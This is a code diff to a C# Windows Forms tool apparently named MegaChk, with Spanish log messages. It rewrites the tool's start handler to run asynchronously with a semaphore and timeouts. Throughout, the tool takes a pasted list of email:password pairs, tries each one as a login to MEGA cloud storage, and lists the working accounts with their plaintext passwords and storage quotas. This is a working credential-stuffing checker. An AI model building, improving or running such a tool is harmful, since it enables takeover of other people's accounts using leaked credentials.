@@ -8,6 +8,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -130,45 +131,253 @@ namespace MegaChk
 
         }
 
-        private void buttonStart(object sender, EventArgs e)
+
+
+        private async void buttonStart_Click(object sender, EventArgs e)
         {
+            const bool DEBUG_MODE = true;
+            const int MAX_CONCURRENT_TASKS = 1; // primero prueba con 1
 
-            String contentLista = this.textBoxLista.Text;
-            string[] lineas = contentLista.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
-
-            int initCount = 0;
-            this.labelTotal.Text = "TOTAL: " + lineas.Length;
-            int errors = 0;
-            int valids = 0;
-            foreach (var line in lineas)
+            void Log(string msg)
             {
-                String[] acc = line.Split(new[] { ":" }, StringSplitOptions.None);
+                if (DEBUG_MODE)
+                    Console.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] {msg}");
+            }
+
+            var semaphore = new SemaphoreSlim(MAX_CONCURRENT_TASKS);
+
+            Log("==== INICIO buttonStart_Click ====");
+
+            button1.Enabled = false;
+            dataGridView1.Rows.Clear();
+
+            int total = 0;
+            int validos = 0;
+            int errores = 0;
+            int rowIndex = 0;
+
+            try
+            {
+                string[] lineas = (textBoxLista.Text ?? "")
+                    .Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)
+                    .Select(x => x.Trim())
+                    .Where(x => !string.IsNullOrWhiteSpace(x))
+                    .ToArray();
+
+                total = lineas.Length;
+
+                labelTotal.Text = $"TOTAL: {total}";
+                labelValidos.Text = $"VALIDOS: {validos}";
+                labelErrores.Text = $"ERRORES: {errores}";
+
+                Log($"Total de líneas: {total}");
+
+                var semaphore_ = new SemaphoreSlim(MAX_CONCURRENT_TASKS);
+                var tasks = new List<Task>();
+
+                foreach (string line in lineas)
+                {
+                    tasks.Add(ProcessLineAsync(line));
+                }
+
+                await Task.WhenAll(tasks);
+                Log("Todas las tareas terminaron");
+            }
+            catch (Exception ex)
+            {
+                Log($"EXCEPCIÓN GENERAL: {ex}");
+                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            finally
+            {
+                button1.Enabled = true;
+                Log("buttonStart.Enabled = true");
+                Log("==== FIN buttonStart_Click ====");
+            }
+
+            async Task ProcessLineAsync(string line)
+            {
+                await semaphore.WaitAsync();
+
                 try
                 {
-                    var client = new MegaApiClient();
-                    client.Login(acc[0], acc[1]);
-                    // to MB
-                    var usedQuota = client.GetAccountInformation().UsedQuota;
-                    var usedQuotaMB = usedQuota / (1024 * 1024);
-                    var totalQuota= client.GetAccountInformation().TotalQuota;
-                    var totalQuotaMB = totalQuota / (1024 * 1024);
-                    client.Logout();
-                    this.dataGridView1.Rows.Add(initCount++, acc[0], acc[1], usedQuotaMB, totalQuotaMB);
-                    this.labelTotal.Text = "TOTAL: " + lineas.Length;
-                    valids++;
-                    this.labelValidos.Text = "VALIDOS: " + valids;
-                    this.labelErrores.Text = "ERRORES: " + errors;
+                    Log("--------------------------------------------------");
+                    Log($"Procesando línea: [{line}]");
+
+                    string[] acc = line.Split(new[] { ':' }, 2);
+
+                    if (acc.Length < 2)
+                    {
+                        Log("Formato inválido");
+                        Interlocked.Increment(ref errores);
+                        UpdateCounters(total, validos, errores);
+                        return;
+                    }
+
+                    string email = acc[0].Trim();
+                    string password = acc[1].Trim();
+
+                    if (string.IsNullOrWhiteSpace(email) || string.IsNullOrWhiteSpace(password))
+                    {
+                        Log($"Email o password vacío: [{line}]");
+                        Interlocked.Increment(ref errores);
+                        UpdateCounters(total, validos, errores);
+                        return;
+                    }
+
+                    MegaResult result = await ProcessMegaAccountWithTimeoutAsync(email, password, Log, 5000);
+
+                    if (result == null)
+                    {
+                        Log($"Resultado nulo para {email}");
+                        Interlocked.Increment(ref errores);
+                        UpdateCounters(total, validos, errores);
+                        return;
+                    }
+
+                    int currentRow = Interlocked.Increment(ref rowIndex) - 1;
+
+                    BeginInvoke((Action)(() =>
+                    {
+                        try
+                        {
+                            Log($"Añadiendo fila a tabla para {email}");
+
+                            dataGridView1.Rows.Add(
+                                currentRow,
+                                result.Email,
+                                result.Password,
+                                result.UsedQuotaMB,
+                                result.TotalQuotaMB
+                            );
+
+                            Log($"Fila añadida OK para {email}");
+                        }
+                        catch (Exception ex)
+                        {
+                            Log($"ERROR al añadir fila para {email}: {ex}");
+                        }
+                    }));
+
+                    Interlocked.Increment(ref validos);
+                    UpdateCounters(total, validos, errores);
+
+                    Log($"Cuenta OK: {email}");
                 }
                 catch (Exception ex)
                 {
-                    errors++;
-                    this.labelTotal.Text = "TOTAL: " + lineas.Length;
-                    this.labelValidos.Text = "VALIDOS: " + valids;
-                    this.labelErrores.Text = "ERRORES: " + errors;
-                    Console.WriteLine(ex.Message);
+                    Log($"EXCEPCIÓN en ProcessLineAsync: {ex}");
+                    Interlocked.Increment(ref errores);
+                    UpdateCounters(total, validos, errores);
+                }
+                finally
+                {
+                    semaphore.Release();
                 }
             }
-            
         }
+
+        private void UpdateCounters(int total, int validos, int errores)
+        {
+            if (InvokeRequired)
+            {
+                BeginInvoke((Action)(() => UpdateCounters(total, validos, errores)));
+                return;
+            }
+
+            labelTotal.Text = $"TOTAL: {total}";
+            labelValidos.Text = $"VALIDOS: {validos}";
+            labelErrores.Text = $"ERRORES: {errores}";
+        }
+
+        private async Task<MegaResult> ProcessMegaAccountWithTimeoutAsync(
+            string email,
+            string password,
+            Action<string> log,
+            int timeoutMs)
+        {
+            var workTask = Task.Run(() =>
+            {
+                MegaApiClient client = null;
+                bool loggedIn = false;
+
+                try
+                {
+                    log($"[Mega] Inicio para {email}");
+
+                    client = new MegaApiClient();
+
+                    log($"[Mega] Antes de Login({email})");
+                    client.Login(email, password);
+                    log($"[Mega] Después de Login({email})");
+
+                    if (!client.IsLoggedIn)
+                    {
+                        log($"[Mega] IsLoggedIn = false para {email}");
+                        return null;
+                    }
+
+                    loggedIn = true;
+                    log($"[Mega] Login correcto para {email}");
+
+                    log($"[Mega] Antes de GetAccountInformation({email})");
+                    var info = client.GetAccountInformation();
+                    log($"[Mega] Después de GetAccountInformation({email})");
+
+                    long usedQuotaMB = info.UsedQuota / (1024 * 1024);
+                    long totalQuotaMB = info.TotalQuota / (1024 * 1024);
+
+                    log($"[Mega] used={usedQuotaMB}MB total={totalQuotaMB}MB para {email}");
+
+                    return new MegaResult
+                    {
+                        Email = email,
+                        Password = password,
+                        UsedQuotaMB = usedQuotaMB,
+                        TotalQuotaMB = totalQuotaMB
+                    };
+                }
+                catch (Exception ex)
+                {
+                    log($"[Mega] EXCEPCIÓN para {email}: {ex}");
+                    return null;
+                }
+                finally
+                {
+                    if (client != null && loggedIn)
+                    {
+                        try
+                        {
+                            log($"[Mega] Antes de Logout({email})");
+                            client.Logout();
+                            log($"[Mega] Logout OK para {email}");
+                        }
+                        catch (Exception ex)
+                        {
+                            log($"[Mega] Error en Logout para {email}: {ex}");
+                        }
+                    }
+                }
+            });
+
+            var completed = await Task.WhenAny(workTask, Task.Delay(timeoutMs));
+
+            if (completed != workTask)
+            {
+                log($"[Mega] TIMEOUT para {email} después de {timeoutMs} ms");
+                return null;
+            }
+
+            return await workTask;
+        }
+
     }
+}
+
+public class MegaResult
+{
+    public string Email { get; set; }
+    public string Password { get; set; }
+    public long UsedQuotaMB { get; set; }
+    public long TotalQuotaMB { get; set; }
 }
